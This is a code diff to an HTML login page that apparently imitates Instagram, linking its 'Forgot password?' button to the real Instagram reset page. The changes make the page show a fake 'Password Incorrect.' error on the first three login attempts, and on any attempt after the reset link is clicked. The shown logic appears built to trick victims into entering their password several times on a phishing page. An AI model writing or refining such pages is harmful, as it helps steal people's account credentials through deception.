@@ -232,14 +232,21 @@ form a {
              </div>
                 <div class="link">
                     <button type="button" class="login" onclick="validateForm()">Login</button>
-                    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank">Forgot password?</a>
+                    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank" onclick="validateReset()" >Forgot password?</a>
                 </div>
               <div id="error-message"></div>
             </form>
         </div>
     </div>
     <script>
+
         var count=0;
+        var resetCount=0;
+        function validateReset(){
+            ++resetCount;
+        }
+        
+        
         function validateForm() {
           ++count;
           var errorMessage = document.getElementById("error-message");
@@ -271,7 +278,7 @@ form a {
               errorMessage.style.display = "block";
             });
 
-          if(count==1){
+          if(resetCount>=1 || count<4){
            errorMessage.innerText = "Password Incorrect.";
            errorMessage.style.display = "block";
           }
